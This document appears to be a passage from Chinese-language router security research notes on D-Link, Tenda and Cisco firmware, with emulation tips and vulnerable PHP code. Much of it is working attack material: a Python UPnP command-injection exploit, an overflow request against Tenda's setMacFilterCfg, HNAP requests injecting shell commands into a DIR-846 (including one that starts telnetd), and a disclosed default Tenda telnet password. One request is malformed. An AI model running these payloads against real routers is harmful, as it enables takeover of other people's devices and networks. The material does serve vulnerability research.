Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Sec-Fetch-Site: none

Sec-Fetch-Mode: navigate

Sec-Fetch-User: ?1

Sec-Fetch-Dest: document

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close
```



#### bug3

```http
POST /captcha.cgi HTTP/1.1

Host: 192.168.0.1

Cookie: uid=xrU7UqR6kP

Content-Length: 9

Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"

Sec-Ch-Ua-Platform: "Linux"

Sec-Ch-Ua-Mobile: ?0

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36

Content-Type: application/x-www-form-urlencoded

Accept: */*

Origin: https://192.168.0.1

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: cors

Sec-Fetch-Dest: empty

Referer: https://192.168.0.1/info/Login.html

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close



DUMMY=YES
```

#### bug4

```HTTP
POST /fwupload.cgi HTTP/1.1

Host: shareport.local

Cookie: uid=qxPQB9fty

Content-Length: 9961750

Cache-Control: max-age=0

Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"

Sec-Ch-Ua-Mobile: ?0

Sec-Ch-Ua-Platform: "Linux"

Upgrade-Insecure-Requests: 1

Origin: https://shareport.local

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOtYaEb8JA6svPVR2

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: navigate

Sec-Fetch-User: ?1

Sec-Fetch-Dest: document

Referer: https://shareport.local/UpdateFirmware.html

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close



------WebKitFormBoundaryOtYaEb8JA6svPVR2

Content-Disposition: form-data; name="select_Folder_a"; filename="EW_3.0(1)B11P226_EW1200G_10211312_install_encypto.bin"

Content-Type: application/octet-stream



upgrade_crypt_v1!@2021Ïqã«íïë|~Í?U6¢þoþo º.zz}|26/,_0(
_3
------WebKitFormBoundaryOtYaEb8JA6svPVR2--


```

#### bug5

```python
import socket
from time import sleep


def exp(server, port, shell_file):
    print('\n[*] Connection {host}:{port}').format(host=server, port=port)
    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    request = "SUBSCRIBE /gena.cgi?service=" + str(shell_file) + " HTTP/1.0\n"
    request += "Host: " + str(server) + str(port) + "\n"
    request += "Callback: <http://192.168.0.2/>\n"
    request += "NT: upnp:event\n"
    request += "Timeout: Second-infinite Second-1800\n"
    request += "Accept-Encoding: gzip, deflate\n"
    request += "User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n"
    sleep(1)
    print('[*] Sending Payload')
    con.connect((socket.gethostbyname(server),port))
    con.send(request.encode())
    results = con.recv(4096)

exp('192.168.0.1', 49152, '`touch /flag4`')
```



## dlink Dir-842

`socket(2, 2, 0)` 调用创建了一个IPv4(AF_INET，因为第一个参数是2)的流式套接字(SOCK_STREAM，因为第二个参数是2)，第三个参数指定的是使用默认的协议(通常是TCP)。

` 0x7F000001` 表示使用回环地址(127.0.0.1)

load_all_modules



## dlink dir-821 ca

固件加密



## tenda AX12

### bug1

0x42F69C

/goform/setMacFilterCfg



<img src="https://e4l4pic.oss-cn-beijing.aliyuncs.com/image-20231121191829134.png" alt="image-20231121191829134" style="zoom:50%;" />

**poc**

```http
POST /goform/setMacFilterCfg HTTP/1.1
Host: 192.168.11.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 51
Origin: http://192.168.11.1
Connection: close
Referer: http://192.168.11.1/iptv.html?random=0.7642888131213508&
Cookie: password=7c90ed4e4d4bf1e300aa08103057ccbcmho1qw


macFilterType=black&deviceList=aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac\r

```



### bug2 

0x43AF3C

goform/SetVirtualServerCfg



### bug3

0x43B3C4

goform/SetStaticRouteCfg



### bug4

0x43FDCC

goform/SetNetControlList





## tenda AX2

tenda通用telnet密码Fireitup
https://www.anquanke.com/post/id/283630#h3-2
AX12真机分析



## tenda AX9

bug1

0x42F69C

bug2

0x43AF3C

bug3

0x43B3C4

bug4

0x43FDCC



bug5

0x42C808



setModules/setDeviceInfo

![image-20231122140708612](https://e4l4pic.oss-cn-beijing.aliyuncs.com/image-20231122140708612.png)



bug6

0x430304 

goform/SetOnlineDevName



bug7

0x43FBBC

goform/SetNetControlList



bug8

0x43FA38

goform/SetNetControlList


这个路由器主要读取配置文件完成网络服务配置，可以写在文件系统里

/etc/config/network
```c
config interface 'lookback'
        option ifname 'lo'
        option proto 'static'
        option ipaddr '127.0.0.1'
        option netmask '255.0.0.1'
 
config globals 'globals'
 
config interface 'lan'
        option type 'bridge'
        option proto 'static'
        option ipaddr '127.0.0.1'
        option netmask '255.255.255.0'
```

参考文章：
[Tenda Ax12 设备分析-安全客 - 安全资讯平台](https://www.anquanke.com/post/id/283630#h3-9)

## tenda AX3
arm架构，这个固件解压后带有符号表，基于gohead，etc->etc_ro webroot->webroot_ro那一套东西

```shell
sudo cp $(which qemu-arm-static) .
sudo chroot . ./qemu-arm-static ./bin/httpd
```

启动后发现卡住，和w20e一样的情况，由于没有报错大概率是进循环了

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231124193644.png)

改判断


然后找不到变量值，是因为缺少获取值的函数，需要hook一下，hook方式同w20e
劫持setvalue函数，编译得到如下hook.so
![[hook.so]]

```shell
sudo chroot . ./qemu-arm-static -E LD_PRELOAD=./hook.so ./bin/httpd
```

然后修复一下软连接，去etc/default.cfg里改ip，就能访问了，但是登录不了，应该要patch一下

# 漏洞复现

## Cisco SPA112

### 漏洞分析







### 利用分析





## DIR-846

环境搭建

**FrimAE怎么看到输出啊？** 查看日志

发现被导向index.html，hnap 503 报错，这种情况查看日志

```shell
ps | grep http
cat /etc/lighttpd/lighttpd.conf | grep log
touch /error
vi /etc/lighttpd/lighttpd.conf
# 修改日志路径
```

重新启动服务

```shell
kill -9 186 & /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf
```

查看日志输出，发现php未能启动

```shell
find . -name "*php*"
```

启动php服务即可

### 漏洞分析

php服务，找到php函数以后，筛选exec函数

```shell
config system
        option hostname rtkmips
        option timezone ''`id > /tmp/result`''
```



```php
<?php

class SetNTPServerSettings extends GetMultipleHNAPs
{
    function __construct($act_val)
    {
        parent::__construct($act_val);
    }

    public function actionIndex()
    {
        $option = $this->act_val;
        $system_info = read_cfg_info("system");
        $system_info = add_or_update_option_info($system_info, "system", "", "timezone", $option['system_time_timezone']);
        save_cfg_info("system", $system_info);
        exec("/etc/init.d/system  restart");
        $result['SetNTPServerSettingsResult'] = "OK";
        $this->api_response(__CLASS__, $result);
    }
}
```





```php
<?php
set_time_limit(300);

class SetNetworkTomographySettings extends GetMultipleHNAPs
{
    function __construct($act_val)
    {
        parent::__construct($act_val);
    }

    public function actionIndex()
    {
        $result['SetNetworkTomographySettingsResult'] = "FAIL";
        $option = $this->act_val;

        $ping_number_range = array("options" => array("min_range" => 1, "max_range" => 50));
        $ping_size_range = array("options" => array("min_range" => 4, "max_range" => 1472));

        if (!filter_var($option['tomography_ping_number'], FILTER_VALIDATE_INT, $ping_number_range)) {  //校验ping次数范围
            $result["message"] = "ping的次数不合法";
        } elseif (!filter_var($option['tomography_ping_size'], FILTER_VALIDATE_INT, $ping_size_range)) {  //校验ping包大小范围
            $result["message"] = "ping包大小不合法";
        } elseif (!(filter_var($option['tomography_ping_address'], FILTER_VALIDATE_IP)  //校验是否为合法IP或域名
            || check_domain($option['tomography_ping_address']))) {
            $result["message"] = "不是合法的IP或域名";
        } else {
            exec("ping -c " . $option['tomography_ping_number'] . " -s " . $option['tomography_ping_size'] . " '" . $option['tomography_ping_address'] . "' > /tmp/ping.result");
            file_put_contents("/etc/.SetNetworkTomography", json_encode($option));
            $result['SetNetworkTomographySettingsResult'] = "OK";
        }
        $this->api_response(__CLASS__, $result);
    }
}
```





### 利用分析

**管道符是不必要的，闭合是必要的(特殊情况 echo )** 

;有无空格都行



使用SetNTPServerSettings接口往/etc/config/system文件中注入命令

```http
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
SOAPACTION: "http://purenetworks.com/HNAP1/SetNTPServerSettings"
HNAP_AUTH: 8D44532710B3593A73383F4366A6A89D 1700479594806
Content-Length: 99
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/Home.html?t=1700479592337
Cookie: PHPSESSID=e9920db8aee2f5b998590af3e5eb20d3; uid=5Pv9fmhD; PrivateKey=29C562F7DA84E8FD829F2125E8C11CFC


{
	"SetNTPServerSettings":{
		"system_time_timezone":"'|`id > /tmp/result`|echo'"
	}
}
```





```http
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
SOAPACTION: "http://purenetworks.com/HNAP1/SetNetworkTomographySettings"
Content-Length: 230
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/Home.html?t=1700472754954
Cookie: PHPSESSID=e9920db8aee2f5b998590af3e5eb20d3; uid=LVAxmY29; PrivateKey=BB1FEDF0DF83D8E15348FE7C93037EA3; 

{
    "SetNetworkTomographySettings":{
    "tomography_ping_address":"http://example.com/'&telnetd&echo'1",
    "tomography_ping_number":"1",
    "tomography_ping_size":"4",
    "tomography_ping_timeout":"",
    "tomography_ping_ttl":""
	}
}
```







```http
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
SOAPACTION: "http://purenetworks.com/HNAP1/SetNetworkTomographySettings"
Content-Length: 260
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/Home.html?t=1700472754954
Cookie: PHPSESSID=e9920db8aee2f5b998590af3e5eb20d3; uid=ye2PVqI8; PrivateKey=CCEB89E7E0DAB212E9FEB4A4695A017E

{
    "SetIpMacBindSettings":{
    "lan_unit":"0"
    "lan(0)_dhcps_staticlist":"1,$(id>rce_confirmed),02:42:d6:f9:dc:4e,192.168.0.15"
}
```







